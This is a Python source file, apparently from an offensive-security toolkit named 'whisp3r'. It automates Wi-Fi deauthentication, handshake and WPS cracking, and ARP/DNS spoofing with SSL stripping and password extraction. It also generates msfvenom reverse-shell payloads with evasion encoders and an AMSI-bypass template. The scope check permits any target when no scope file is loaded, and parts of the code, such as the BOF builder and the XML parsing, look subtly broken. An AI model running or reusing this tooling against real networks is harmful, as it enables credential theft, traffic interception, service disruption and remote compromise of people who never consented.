class ConfigManager:
    def __init__(self, config_path=CONFIG_PATH):
        self.config_path = Path(config_path)
        self.defaults = {"opsec": {"jitter": True, "rate_limit_ms": 100}, "logging": {"level": "INFO", "rotate_mb": 50}, "plugins": {"auto_load": True}, "reporting": {"siem_webhook": "", "format": "json"}}
        self.config = self.defaults.copy()
        if self.config_path.exists():
            try: self.config.update(json.loads(self.config_path.read_text()))
            except: pass
        else:
            self.save()
    def save(self):
        self.config_path.parent.mkdir(parents=True, exist_ok=True)
        self.config_path.write_text(json.dumps(self.config, indent=2))
    def get(self, key, default=None):
        keys = key.split('.')
        val = self.config
        for k in keys: val = val.get(k, {}) if isinstance(val, dict) else default
        return val

class ScopeValidator:
    def __init__(self, scope_file=None):
        self.allowed_ips = set()
        self.allowed_ranges = []
        self.denied_ips = set()
        self.scope_loaded = False
        if scope_file and Path(scope_file).exists():
            self.load_scope(scope_file)
    def load_scope(self, file_path):
        try:
            with open(file_path, 'r') as f: data = json.load(f)
            for item in data.get("targets", []):
                if '/' in item: self.allowed_ranges.append(ipaddress.ip_network(item, strict=False))
                else: self.allowed_ips.add(item)
            for item in data.get("excluded", []):
                self.denied_ips.add(item)
            self.scope_loaded = True
        except: pass
    def validate(self, ip_str):
        if not self.scope_loaded: return True
        try:
            ip = ipaddress.ip_address(ip_str)
            if ip_str in self.denied_ips: return False
            if ip_str in self.allowed_ips: return True
            for net in self.allowed_ranges:
                if ip in net: return True
            return False
        except: return False

class ThreatIntelSync:
    def __init__(self, db_path=CVE_DB_PATH):
        self.db_path = Path(db_path)
        self.cache = {}
    def load_local(self):
        if self.db_path.exists():
            try:
                data = json.loads(self.db_path.read_text())
                self.cache = {k: CVEEntry(**v) for k, v in data.items()}
            except: pass
        return self.cache
    def fetch_epss(self, cve_list=None):
        try:
            req = urllib.request.Request(f"{EPSS_API_URL}?score_gte=0.1&format=csv")
            with urllib.request.urlopen(req, timeout=15) as res:
                lines = res.read().decode().splitlines()
                scores = {}
                for line in lines[1:]:
                    parts = line.split(',')
                    if len(parts) >= 2: scores[parts[0]] = float(parts[1])
                return scores
        except: return {}
    def fetch_cisa_kev(self):
        try:
            with urllib.request.urlopen(CISA_KEV_URL, timeout=15) as res:
                data = json.loads(res.read().decode())
                return {v["cveID"]: v for v in data.get("vulnerabilities", [])}
        except: return {}
    def check_searchsploit_poc(self, cve_id):
        if not SEARCHSPLOIT_BIN: return False, None
        try:
            res = subprocess.run([SEARCHSPLOIT_BIN, cve_id, "--json", "--exclude=dos"], capture_output=True, text=True, timeout=10)
            if res.returncode == 0 and res.stdout.strip():
                exploits = json.loads(res.stdout.strip())
                return True, exploits[0].get("detail") if exploits else None
        except: pass
        return False, None
    def calculate_reliability(self, epss, has_poc, cisa_kev, attackerkb):
        base = epss * 0.4
        poc_mod = 0.3 if has_poc else 0.0
        kev_mod = 0.2 if cisa_kev else 0.0
        atk_mod = 0.1 if attackerkb else 0.0
        return min(base + poc_mod + kev_mod + atk_mod, 1.0)
    def update_and_return(self):
        db = self.load_local()
        epss_scores = self.fetch_epss()
        kev_data = self.fetch_cisa_kev()
        updated = False
        for cve_id, entry in db.items():
            entry.epss_score = epss_scores.get(cve_id, entry.epss_score)
            entry.cisa_kev = cve_id in kev_data
            has_poc, poc_url = self.check_searchsploit_poc(cve_id)
            entry.has_poc = has_poc
            if poc_url: entry.poc_url = poc_url
            entry.reliability_score = self.calculate_reliability(entry.epss_score, entry.has_poc, entry.cisa_kev, entry.attackerkb_in_wild)
            updated = True
        if updated:
            self.db_path.write_text(json.dumps({k: asdict(v) for k, v in db.items()}, indent=2))
        return db

class AsyncTaskQueue:
    def __init__(self, max_workers=8):
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
        self.futures = []
    def submit(self, fn, *args, **kwargs):
        future = self.executor.submit(fn, *args, **kwargs)
        self.futures.append(future)
        return future
    def wait_all(self, timeout=300):
        concurrent.futures.wait(self.futures, timeout=timeout)
        self.futures.clear()

class ReconWireless:
    def __init__(self, iface, dry_run=False, authorized=False, scope=None, opsec=None):
        self.iface = iface
        self.dry_run = dry_run
        self.authorized = authorized
        self.scope = scope
        self.opsec = opsec or {}
    def run_cmd(self, cmd, timeout=30):
        if self.dry_run:
            logger.info(f"[DRY RUN] {' '.join(cmd)}")
            return None
        if self.opsec.get("jitter"):
            time.sleep(random.uniform(0, self.opsec.get("jitter_ms", 50)/1000))
        try:
            return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout).stdout.strip()
        except: return None
    def detect_adapters(self):
        out = self.run_cmd(["iw", "dev"])
        if not out: return []
        adapters = []
        for line in out.splitlines():
            if "Interface" in line:
                iface = line.split()[-1]
                mac = self.run_cmd(["cat", f"/sys/class/net/{iface}/address"])
                chip = self.run_cmd(["ethtool", "-i", iface])
                supports_pmkid = HCXPCAP_BIN is not None
                adapters.append(WirelessAdapter(name=iface, mac=mac, chipset=chip, supports_pmkid=supports_pmkid))
        return adapters
    def monitor_toggle(self, enable=True):
        if self.dry_run: return
        down = ["ip", "link", "set", self.iface, "down"]
        type_cmd = ["iw", "dev", self.iface, "set", "type", "monitor" if enable else "managed"]
        up = ["ip", "link", "set", self.iface, "up"]
        self.run_cmd(down)
        self.run_cmd(type_cmd)
        self.run_cmd(up)
    def capture_ap(self, duration=60, channel=None, prefix="whisp3r_cap"):
        if not self.scope: return None
        out_dir = OUTPUT_DIR / "captures"
        out_dir.mkdir(parents=True, exist_ok=True)
        csv_path = out_dir / f"{prefix}-01.csv"
        pcap_path = out_dir / f"{prefix}-01.pcapng"
        cmd = [AIRODUMP_BIN, "-w", str(out_dir/prefix), "--output-format", "pcap,csv"]
        if channel: cmd.extend(["-c", str(channel)])
        cmd.append(self.iface)
        if self.dry_run: return csv_path
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        proc.terminate()
        return csv_path, pcap_path
    def parse_aps(self, csv_path):
        aps = []
        if not Path(csv_path).exists(): return aps
        with open(csv_path, 'r', errors='ignore') as f:
            reader = csv.reader(f)
            in_ap = False
            for row in reader:
                if not row or row[0].startswith('#'): continue
                if row[0].strip() == "BSSID": in_ap = True; continue
                if in_ap and len(row) >= 14:
                    if row[13].strip() == "Client": break
                    aps.append(AccessPoint(bssid=row[0].strip(), essid=row[13].strip(), channel=int(row[3]) if row[3].isdigit() else 0, encryption=row[5].strip(), signal=int(row[8]) if row[8].lstrip('-').isdigit() else -100))
        return aps
    def deauth_target(self, bssid, client=None, count=50, duration=5):
        if not self.authorized: raise PermissionError("Unauthorized")
        if count > 500: raise ValueError("Deauth count exceeds safety limit")
        if duration > 30: raise ValueError("Duration exceeds safety limit")
        cmd = [AIREPLAY_BIN, "--deauth", str(count)]
        if client: cmd.extend(["-c", client])
        cmd.extend(["-a", bssid, self.iface])
        if self.dry_run: return
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        proc.terminate()
    def capture_handshake(self, pcap_path):
        out = self.run_cmd([AIRCRACK_BIN, pcap_path, "-J", "temp_check"])
        return "1 handshake" in out if out else False
    def crack_handshake(self, pcap_path, wordlist):
        if not Path(wordlist).exists(): return None
        out_dir = OUTPUT_DIR / "cracked"
        out_dir.mkdir(parents=True, exist_ok=True)
        cmd = [AIRCRACK_BIN, pcap_path, "-w", wordlist, "-l", str(out_dir/"key.txt")]
        self.run_cmd(cmd, timeout=3600)
        key_file = out_dir / "key.txt"
        return key_file.read_text().strip() if key_file.exists() else None
    def wps_recon(self, bssid):
        if not REVER_BIN and not BULLY_BIN: return None
        tool = REVER_BIN or BULLY_BIN
        cmd = [tool, "-i", self.iface, "-b", bssid, "-vv"]
        self.run_cmd(cmd, timeout=1200)

class ReconNetwork:
    def __init__(self, dry_run=False, authorized=False, scope=None, opsec=None):
        self.dry_run = dry_run
        self.authorized = authorized
        self.scope = scope
        self.opsec = opsec or {}
    def discover(self, subnet, interface):
        if not NMAP_BIN: return []
        xml_out = OUTPUT_DIR / f"nmap_discovery_{int(time.time())}.xml"
        xml_out.parent.mkdir(parents=True, exist_ok=True)
        cmd = [NMAP_BIN, "-sn", "-oX", str(xml_out), subnet, "-e", interface]
        if self.dry_run: return []
        self.run_cmd(cmd, timeout=300)
        return self.parse_nmap_xml(xml_out)
    def service_scan(self, host_ip, interface):
        xml_out = OUTPUT_DIR / f"nmap_service_{host_ip}_{int(time.time())}.xml"
        cmd = [NMAP_BIN, "-sV", "-sC", "--osscan-limit", "-oX", str(xml_out), "-Pn", host_ip, "-e", interface]
        if self.dry_run: return Host(ip=host_ip)
        self.run_cmd(cmd, timeout=600)
        return self.parse_service_xml(xml_out, host_ip)
    def parse_nmap_xml(self, path):
        hosts = []
        if not Path(path).exists(): return hosts
        tree = ET.parse(path)
        for host_elem in tree.findall('.//host'):
            ip_elem = host_elem.find('.//address[@addrtype="ipv4"]')
            mac_elem = host_elem.find('.//address[@addrtype="mac"]')
            hostname_elem = host_elem.find('.//hostnames/hostname')
            if ip_elem:
                hosts.append(Host(ip=ip_elem.get('addr'), mac=mac_elem.get('addr') if mac_elem else None, hostname=hostname_elem.get('name') if hostname_elem else None))
        return hosts
    def parse_service_xml(self, path, host_ip):
        host = Host(ip=host_ip)
        if not Path(path).exists(): return host
        tree = ET.parse(path)
        host_elem = tree.find('.//host')
        if not host_elem: return host
        os_match = host_elem.find('.//osmatch')
        if os_match: host.os_detection = os_match.get('name')
        for port in host_elem.findall('.//port'):
            state = port.find('state')
            if state and state.get('state') == 'open':
                port_id = int(port.get('portid'))
                proto = port.get('protocol')
                svc = port.find('service')
                banner = f"{svc.get('product','')} {svc.get('version','')}".strip() if svc else "Unknown"
                host.service_banners[port_id] = banner
                if proto == 'tcp': host.open_tcp_ports.append(port_id)
                elif proto == 'udp': host.open_udp_ports.append(port_id)
        return host
    def run_cmd(self, cmd, timeout=30):
        if self.opsec.get("jitter"): time.sleep(random.uniform(0, self.opsec.get("jitter_ms", 50)/1000))
        if self.dry_run: return None
        try: return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout).stdout.strip()
        except: return None

class MITMEngine:
    def __init__(self, config: MITMConfig, authorized=False, dry_run=False):
        self.config = config
        self.authorized = authorized
        self.dry_run = dry_run
        self.original_routes = {}
        self.captured_creds = []
    def start(self):
        if not self.authorized: raise PermissionError("Unauthorized")
        if self.dry_run: return True
        self.original_routes["ip_forward"] = subprocess.run(["sysctl", "net.ipv4.ip_forward"], capture_output=True, text=True).stdout.strip().split('=')[-1]
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        if self.config.spoof_arp: self.run_arp_spoof()
        if self.config.spoof_dns: self.run_dns_spoof()
        if self.config.ssl_strip: self.run_ssl_strip()
        if self.config.packet_capture: self.run_packet_capture()
        return True
    def run_arp_spoof(self):
        if not ARP_BIN: return
        t1 = [ARP_BIN, "-i", self.config.interface, "-t", self.config.target_ip, self.config.gateway_ip]
        t2 = [ARP_BIN, "-i", self.config.interface, "-t", self.config.gateway_ip, self.config.target_ip]
        subprocess.Popen(t1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(t2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    def run_dns_spoof(self):
        hosts = f"{self.config.target_ip} *google.com *\n{self.config.target_ip} *microsoft.com *\n"
        (OUTPUT_DIR / "spoof_hosts.txt").write_text(hosts)
        if BETTERCAP_BIN:
            subprocess.Popen([BETTERCAP_BIN, "-iface", self.config.interface, "-eval", f"set dns.spoof.hosts {OUTPUT_DIR / 'spoof_hosts.txt'}; dns.spoof on"], stdout=subprocess.DEVNULL)
    def run_ssl_strip(self):
        if BETTERCAP_BIN:
            subprocess.Popen([BETTERCAP_BIN, "-iface", self.config.interface, "-eval", "http.proxy on; http.proxy.sslstrip on"], stdout=subprocess.DEVNULL)
    def run_packet_capture(self):
        pcap_out = OUTPUT_DIR / f"mitm_{int(time.time())}.pcap"
        tcpdump = ["tcpdump", "-i", self.config.interface, "-w", str(pcap_out), "host", self.config.target_ip]
        subprocess.Popen(tcpdump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    def parse_credentials(self, pcap_path):
        creds = []
        if not Path(pcap_path).exists(): return creds
        out = subprocess.run([RESPONDER_BIN, "-A", "-i", self.config.interface, "-f", str(pcap_path)], capture_output=True, text=True, timeout=60)
        if out.stdout:
            lines = out.stdout.splitlines()
            for line in lines:
                if "Password" in line:
                    parts = line.split()
                    if len(parts) >= 3: creds.append({"user": parts[0], "pass": parts[-1], "hash": parts[1]})
        return creds
    def cleanup(self):
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={self.original_routes.get('ip_forward', '0')}"])
        subprocess.run(["ip", "route", "flush", "table", "local"])
        subprocess.run(["pkill", "-9", "arpspoof"])
        subprocess.run(["pkill", "-9", "bettercap"])
        subprocess.run(["pkill", "-9", "tcpdump"])

class PayloadAgent:
    def __init__(self, dry_run=False, authorized=False, scope=None, opsec=None):
        self.dry_run = dry_run
        self.authorized = authorized
        self.scope = scope
        self.opsec = opsec or {}
    def generate(self, config: PayloadConfig):
        if not self.authorized: raise PermissionError("Unauthorized")
        if self.scope and not self.scope.validate(config.lhost): raise ValueError("LHOST outside authorized scope")
        if config.raw_shellcode: return self.build_raw_shellcode(config)
        if config.bof_mode: return self.build_bof(config)
        cmd = [MSFVENOM_BIN, "-p", config.recommended_payload, f"LHOST={config.lhost}", f"LPORT={config.lport}", "-f", config.format_type]
        if config.evasion_enabled:
            if config.encoding_type: cmd.extend(["-e", config.encoding_type, "-i", "5"])
            if config.amsi_bypass: cmd.extend(["--template", "/opt/whisp3r/templates/amsi_bypass.ps1"])
        out_path = Path(config.output_path or "./payloads") / f"{config.cve_id}_{int(time.time())}.{config.format_type}"
        out_path.parent.mkdir(parents=True, exist_ok=True)
        cmd.extend(["-o", str(out_path)])
        if self.dry_run: return str(out_path)
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        if res.returncode != 0: raise RuntimeError("msfvenom failed")
        return str(out_path)
    def build_raw_shellcode(self, config):
        out_path = Path("./payloads") / f"{config.cve_id}_raw_sc.bin"
        out_path.parent.mkdir(parents=True, exist_ok=True)
        with open(out_path, 'wb') as f: f.write(bytes.fromhex(config.raw_shellcode.replace(" ", "")))
        return str(out_path)
    def build_bof(self, config):
        out_path = Path("./payloads") / f"{config.cve_id}.o"
        out_path.parent.mkdir(parents=True, exist_ok=True)
        template = f"DECLSPEC void go(char * argv[], int argc) {{\n    __asm__ volatile('.byte 0x90, 0xc3');\n}}"
        out_path.write_text(template)
        return str(out_path)
    def verify_payload(self, path):
        if not Path(path).exists(): return False
        size = Path(path).stat().st_size
        if size < 100: return False
        out = subprocess.run(["file", path], capture_output=True, text=True)
        return "executable" in out.stdout.lower() or "data" in out.stdout.lower()

class ReportGenerator:
    def __init__(self, output_dir=OUTPUT_DIR):
        self.dir = Path(output_dir)
        self.dir.mkdir(parents=True, exist_ok=True)
    def export_json(self, data, filename):
        path = self.dir / f"{filename}.json"
        path.write_text(json.dumps(data, indent=2, default=str))
        return str(path)
    def export_csv(self, data, filename):
        if not data: return None
        path = self.dir / f"{filename}.csv"
        with open(path, 'w', newline='') as f:
            w = csv.DictWriter(f, fieldnames=data[0].keys())
            w.writeheader()
            w.writerows(data)
        return str(path)
    def send_siem_webhook(self, url, payload):
        if not url: return
        try:
            req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=10)
        except: pass
    def generate_executive_report(self, findings):
        html = f"<html><head><title>whisp3r Report v{TOOL_VERSION}</title></head><body>"
        html += f"<h1>Offensive Security Assessment</h1><p>Date: {datetime.now().strftime('%Y-%m-%d')}</p>"
        html += "<h2>Critical Findings</h2><ul>"
        for f in findings[:5]:
            html += f"<li><strong>{f.get('cve_id','Unknown')}</strong> | Reliability: {f.get('reliability_score',0)*100:.1f}% | Remediation: {f.get('remediation','Patch/Update')}</li>"
        html += "</ul></body></html>"
        path = self.dir / "executive_report.html"
        path.write_text(html)
        return str(path)

